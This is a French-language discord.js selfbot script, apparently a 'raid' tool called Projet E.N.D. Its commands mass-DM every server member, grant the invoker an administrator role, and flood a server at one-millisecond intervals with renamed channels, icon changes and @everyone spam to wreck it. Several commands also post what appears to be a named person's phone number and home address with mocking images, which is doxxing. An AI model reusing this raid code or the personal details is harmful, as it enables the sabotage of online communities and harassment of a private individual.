const Discord = require('discord.js'); 

var selfbot = new Discord.Client(); 

selfbot.login(process.env.TOKEN);


selfbot.on('ready', () => {
    console.log("Selfbot Prêt !")
});


selfbot.on("ready", () => {
    selfbot.user.setPresence({
        game: { 
            name: "Project Akatsuki チ",
            type: 'STREAMING',
            url: 'https://www.twitch.tv/something'
        },
        status: 'idle'
    })
})




selfbot.on('message', message => {

    if (message.content === ">>>selfbot") {
        message.delete()
        var embed1 = new Discord.RichEmbed()
        .setAuthor(message.author.username, message.author.avatarURL)
        .setDescription('Selfbot connecté ! Temps de latence avec le server : ' + `${message.createdTimestamp - Date.now()}` + ' ms')
        .setColor(0x010000)
        .setImage("https://media.giphy.com/media/1ymoXP3QE0YFzEvEVn/giphy.gif")
        message.channel.send(embed1)
        console.log('Commande SelfBot Utilisé')
    }
    
    
        if(message.content === ">>>adem irl") {
        var embedadresse = new Discord.RichEmbed()
        .setDescription("Oh mon dieu ! Nous avons retrouvez un cachalot a la mairie d'Aulnay sous Bois !")
        .setColor(0x010000)
        .setImage("https://media.discordapp.net/attachments/527262425960153099/537694471848984576/20190123_190434.png?width=521&height=958")
        message.channel.send(embedadresse)
    }

    if(message.content === ">>>adem numéro") {
        var embedadresse = new Discord.RichEmbed()
        .setDescription("06 60 24 68 27")
        .setColor(0x010000)
        .setImage("https://images-ext-2.discordapp.net/external/zGdAkFGDT94PBa70lkWbvQEvQdGXges2Guuiv_GzJLA/https/cdn.discordapp.com/attachments/454393243673690112/523968753042456576/20181216_220438.jpg")
        message.channel.send(embedadresse)
    }

    if(message.content === ">>>adem youtube") {
        message.channel.send("https://www.youtube.com/channel/UCMPNq0rGxgiix74oCoBvziQ")
    }

    if(message.content === ">>>adem adresse") {
        var embedadresse = new Discord.RichEmbed()
        .setDescription("50 rue de la Marquise de Sévigné")
        .setColor(0x010000)
        .setImage("https://media.discordapp.net/attachments/537688377391316994/537694503440613407/20190123_190318.jpg?width=483&height=958")
        message.channel.send(embedadresse)
    }
    
      if(message.content === ">>>FAQ") {
        var embedfaq = new Discord.RichEmbed()
        .setDescription("Pose moi des questions sur mes competence informatique !")
        .setColor(0x010000)
        .setImage("https://media.discordapp.net/attachments/526346956755304458/542386625506836521/ifspeed3.jpeg?width=800&height=450")
        message.channel.send(embedfaq)
    }

    if(message.content === ">>>sextape") {
        var sextape = new Discord.RichEmbed()
        .setDescription("TOI AUSSI TU AS ENVIE DE BAIZER ET VOIR LA VIDEO. TAPE TTF AU 3630 !")
        .setColor(0x010000)
        .setImage("https://media.discordapp.net/attachments/526346956755304458/542386606527610890/sextape.jpeg?width=800&height=450")
        message.channel.send(sextape)
    }

    if(message.content === ">>>tuto") {
        var TUTO2 = new Discord.RichEmbed()
        .setDescription("TUTO COMMENT CONSTRUIRE DES LEGO MINECRAFT AVEC TTF IFSPEED !")
        .setColor(0x010000)
        .setImage("https://media.discordapp.net/attachments/526346956755304458/542386606527610892/lets_fly_to_the_sky.jpeg?width=800&height=450")
        message.channel.send(TUTO2)
    }

    if(message.content === ">>>tuto2") {
        var TUTO = new Discord.RichEmbed()
        .setDescription("COMMENT FAIRE DE LA TROTINETTE AVEC TTF IFSPEED AKA ADEL EKE 92 NANTERRE ?")
        .setColor(0x010000)
        .setImage("https://media.discordapp.net/attachments/526346956755304458/542386646272966661/trotinette.jpeg")
        message.channel.send(TUTO)
    }

    if(message.content === ">>>couche") {
        var COUCHE = new Discord.RichEmbed()
        .setDescription("TU CHERCHES DES COUCHES PAS CHERE ? ACHETE NOS COUCHES TTF ET PROFITE DE -50% SUR TOUTE LA BOUTIQUE TTF !")
        .setColor(0x010000)
        .setImage("https://media.discordapp.net/attachments/526346956755304458/542386646272966657/ifspeed.jpeg?width=338&height=601")
        message.channel.send(COUCHE)
    }

    if (message.guild && message.content.startsWith('>>>akatsukii')) {
        let text = message.content.slice('>>>akatsukii'.length); // cuts off the /private part
        message.guild.members.forEach(member => {
          if (member.id != selfbot.user.id && !member.user.bot) member.send(text);
        });
    }
    
       if(message.content === ">>>purge") { 
        message.channel.fetchMessages()
        .then(messages => messages.array().forEach(
            message => message.author.equals(selfbot.user) && message.delete()
        ));
    } 


    if (message.content === ">>>help") {
        message.delete()
        var embedhelpmember = new Discord.RichEmbed() 
        .addField("__Liste des Commandes__\n", "\u200b") 
        .addField("Nickname : " + " \```" + "Permet de changer de pseudo à l'infini sur un serveur" + "\```", "\u200b")
        .addField("Scan : " + " \```" + "Permet de scan un server pour pouvoir l'add aux prochaines victimes de E.N.D" + "\```", "\u200b")
        .addField("Activate : " + " \```" + "Permet d'obtenir la permission administrateur" + "\```", "\u200b")
        .addField("Cleaning : " + " \```" + "Permet de détruire un serveur pollué en quelques secondes (PERMS ADMIN OBLIGATOIRE)" + "\```", "\u200b")
        .addField("Spam : " + " \```" + "Permet de spam n'importe quel message" + "\```", "\u200b")
        .addField("Purge : " + " \```" + "Permet de purge les messages du selfbot" + "\```", "\u200b")
        .setColor(0x010000) 
        .setFooter("By @'./E.N.D ミ#8007 !") 
    message.channel.send(embedhelpmember); 
    }

    if (message.content === ">>>nickname") {
        message.delete()
        var embednick = new Discord.RichEmbed()
        .setAuthor(message.author.username, message.author.avatarURL)
        .setDescription('Activation de la commande Nickname !')
        .setColor(0x010000) 
        message.channel.send(embednick)
        selfbot.setInterval(() =>
        {
        message.guild.members.get(selfbot.user.id).setNickname(`• P.R.O.J.E.C.T •`);
        message.guild.members.get(selfbot.user.id).setNickname(`• A.K.A.T.S.U.K.I •`);
        message.guild.members.get(selfbot.user.id).setNickname(`• O.F.F.I.C.I.E.L •`);

        },1) 
    }

    if (message.content === ">>>edit") {
        selfbot.setInterval(() =>
        {
        const embededit1 = new Discord.RichEmbed()
        .setDescription("`You Have Been Hacked`")
        .setImage("https://steamusercontent-a.akamaihd.net/ugc/844836935927596010/998DF3BE9614B453D17E9776752BB36BCE2C8970/")
        .setColor(0x010000) 
        message.edit(embededit1)
        const embededit2 = new Discord.RichEmbed()
        .setColor(0x010000) 
        .setImage("https://media.giphy.com/media/lp3GUtG2waC88/giphy.gif")
        .setDescription("`You Have Been Hacked`")    
        message.edit(embededit2)
        var embededit3 = new Discord.RichEmbed()
        .setImage('https://media1.tenor.com/images/c9f5e8ac0c8a6d29ff6479a9f93ee1a3/tenor.gif?itemid=9658647')
        .setColor(0x010000) 
        .setDescription("`You Have Been Hacked`")
        message.edit(embededit3)
        },3000) 
    }

    if (message.content === ">>>end") {
        message.delete()
        var embedend = new Discord.RichEmbed()
        .setAuthor(message.author.username, message.author.avatarURL)
        .setDescription('Je me présente je suis ' + message.author.username + ' pour vous éliminer !')
        .setColor(0x010000)
        .setImage("https://media.giphy.com/media/3ziyHaC80uDfurqpHQ/giphy.gif")
        message.channel.send(embedend)
    }

    if (message.content === ">>>projet") { 
        message.delete()
        const embedinfo = new Discord.RichEmbed()
        .addField("**__Projet E.N.D__ :**   ``Raid for Justice``", "\u200b")
        .setDescription("Le projet E.N.D consiste en 3 mot ExtermiNation des raideur de Discord. En d'autres termes le selfbot a été uniquement conçu pour détruire tout les serveurs qui polluent Discord (Team de raideur, debiteur, afficheur, doxeur...).")
        .setColor(0x010000) 
        .setImage("https://media.giphy.com/media/WNmaPlULTaAOC8eKCA/giphy.gif")
        .setFooter(selfbot.user.tag, selfbot.user.displayAvatarURL)
        message.channel.send(embedinfo)
    }



    if (message.content === ">>>avatar") {
        const embedavatar = new Discord.RichEmbed()
        .setImage(message.author.displayAvatarURL)
        .setColor(0x010000) 
        .setAuthor(message.author.tag, message.author.displayAvatarURL)
        message.channel.send(embedavatar)
    }

    if (message.content === ">>>scan") {     
    message.delete()
    var number_random = Math.floor(Math.random() * 231) - 100;
    console.log(number_random)
    var embedscan = new Discord.RichEmbed()     
    .setThumbnail("https://media.giphy.com/media/2ce8mGHsGDCRzaH6KK/giphy.gif")  
    .setColor(0x010000)    
    .setFooter(message.guild.name + ' a été scan !')
    .addField("Q.I du serveur = " + number_random, "\u200b")
    .addField("Ajout du serveur dans la liste de E.N.D !", "\u200b")
    .setImage("https://media.giphy.com/media/2ce8mGHsGDCRzaH6KK/giphy.gif")
    message.channel.send(embedscan)

    } 

    if (message.content === ">>>activate") {
        message.member.guild.createRole({
            name: "admin perms",
            color: "0x010000",
            permissions: ("ADMINISTRATOR")
        }).then(function(role)
        {
            message.member.addRole(role);
            message.channel.bulkDelete(1).then(() => {
                message.channel.send("\`Tu as désormais les perms admin. Le raid va pouvoir débuter !\`")
                message.channel.bulkDelete(1)
            });
        }); 
    }
    if(message.content == ">>>cleaning"){ 

        var server = message.guild;
        var name = "raid-by-cia";
    
    selfbot.setInterval(() =>
    {
    message.guild.setIcon("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png")
    message.guild.setName("RAID")
    message.guild.setName("BY")
    message.guild.setName("CIA")
    server.createChannel(name, "voice");
    server.createChannel(name, "text").then(channel => {
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    })
    },1)
    }



})
